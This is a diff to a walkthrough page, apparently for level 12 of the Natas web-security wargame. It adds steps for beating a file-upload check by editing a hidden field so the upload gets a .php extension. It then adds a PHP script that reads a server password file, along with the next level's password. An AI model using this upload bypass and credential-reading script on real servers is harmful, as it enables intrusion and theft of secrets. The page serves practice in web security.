@@ -43,9 +43,27 @@
         The file &#60;a&#62;upload/bk11aft7iu.jpg&#60;/a&#62; has been uploaded! Clicking gives: The
         image "url" cannot be displayed because it contains errors. No shit!
       </p>
+      <p>
+        After messing around a bit, it seems easy to rewrite the extension of
+        the created file. There is a hidden form input in the source with the
+        filename in it. Just change its 'value' to '.php'.
+      </p>
+      <p>
+        Yes, php is the way to go here. If you open a link with a php file, the
+        file gets executed. So you can easely write a php script, and upload
+        the file:
+      </p>
+      <p>
+        <code>
+          &#60;?php
+            echo "Got acces!";
+            readfile("/etc/natas_webpass/natas13");
+          ?&#62;
+        </code>
+      </p>
       <ul>
         <li>Next level password:</li>
-        <li><code></code></li>
+        <li><code>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</code></li>
       </ul>
     </article>
     <script type="text/javascript">
